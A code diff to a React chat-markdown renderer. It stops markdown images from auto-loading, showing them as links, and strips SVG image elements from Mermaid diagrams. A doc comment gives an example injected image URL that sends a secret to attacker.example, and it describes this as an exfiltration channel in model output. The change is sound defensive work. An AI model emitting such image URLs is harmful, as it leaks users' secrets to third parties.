@@ -1,4 +1,4 @@
-import React, { memo, useEffect, useMemo, useRef } from 'react';
+import React, { createContext, memo, useContext, useEffect, useMemo, useRef } from 'react';
 import ReactMarkdown from 'react-markdown';
 import remarkGfm from 'remark-gfm';
 import remarkMath from 'remark-math';
@@ -137,8 +137,12 @@ const MermaidDiagram = memo(function MermaidDiagram({ code, theme }: MermaidDiag
       })
       .then((result) => {
         if (cancelled || !result) return;
+        // The diagram source is model output: elements that fetch a URL
+        // (<image>, <feImage>) would load as soon as the message renders,
+        // the same exfiltration channel as a markdown image.
         container.innerHTML = DOMPurify.sanitize(result.svg, {
           USE_PROFILES: { svg: true, svgFilters: true },
+          FORBID_TAGS: ['image', 'feImage'],
         });
       })
       .catch((err: unknown) => {
@@ -167,6 +171,38 @@ const MermaidDiagram = memo(function MermaidDiagram({ code, theme }: MermaidDiag
     </>
   );
 });
+
+// ── Images ────────────────────────────────────────────────────────
+
+/** True while rendering inside a markdown link (`[![alt](img)](href)`). */
+const InsideLinkContext = createContext(false);
+
+/**
+ * Markdown images are never auto-loaded. Model output is untrusted: an
+ * injected `![x](https://attacker.example/?q=<secret>)` would otherwise make
+ * the browser send data to a third party the moment the message renders. The
+ * image becomes a link the user can choose to open (or plain text inside an
+ * existing link, which already navigates).
+ */
+function MarkdownImage({ src, alt }: { src?: string; alt?: string }) {
+  const insideLink = useContext(InsideLinkContext);
+  const label = alt ? `[image: ${alt}]` : '[image]';
+  // react-markdown's URL transform empties unsafe sources (javascript:, data:, ...).
+  if (!src || insideLink) {
+    return <span className="text-muted-foreground">{label}</span>;
+  }
+  return (
+    <a
+      href={src}
+      target="_blank"
+      rel="noopener noreferrer"
+      title={src}
+      className="text-primary underline underline-offset-2 hover:opacity-80 break-all"
+    >
+      {label}
+    </a>
+  );
+}
 
 // ── Main component ────────────────────────────────────────────────
 
@@ -211,7 +247,7 @@ export const ChatMarkdown = memo(function ChatMarkdown({
             return part;
           });
         });
-        return <p className="leading-relaxed break-words">{processed}</p>;
+        return <p className="leading-relaxed wrap-break-word">{processed}</p>;
       },
 
       // ── Headings ────────────────────────────────────────────────
@@ -246,9 +282,12 @@ export const ChatMarkdown = memo(function ChatMarkdown({
           rel="noopener noreferrer"
           className="text-primary underline underline-offset-2 hover:opacity-80 break-all"
         >
-          {children}
+          <InsideLinkContext.Provider value={true}>{children}</InsideLinkContext.Provider>
         </a>
       ),
+
+      // ── Images: rendered as links, never loaded ─────────────────
+      img: MarkdownImage,
 
       // ── Code: inline only (block handled via pre) ────────────────
       code: ({ className, children }: { className?: string; children?: React.ReactNode }) => {
@@ -256,7 +295,7 @@ export const ChatMarkdown = memo(function ChatMarkdown({
         if (hasLang) return <code className={className}>{children}</code>;
         return (
           <code
-            className={`bg-background/60 border border-muted-foreground/10 px-1 py-0.5 rounded font-mono ${textSmall}`}
+            className={`bg-background/60 border border-muted-foreground/10 px-1 py-0.5 rounded-sm font-mono ${textSmall}`}
           >
             {children}
           </code>
@@ -348,7 +387,7 @@ export const ChatMarkdown = memo(function ChatMarkdown({
               type="checkbox"
               checked={!!checked}
               onChange={() => {}}
-              className="mt-0.5 accent-primary cursor-default pointer-events-none flex-shrink-0"
+              className="mt-0.5 accent-primary cursor-default pointer-events-none shrink-0"
             />
           );
         }
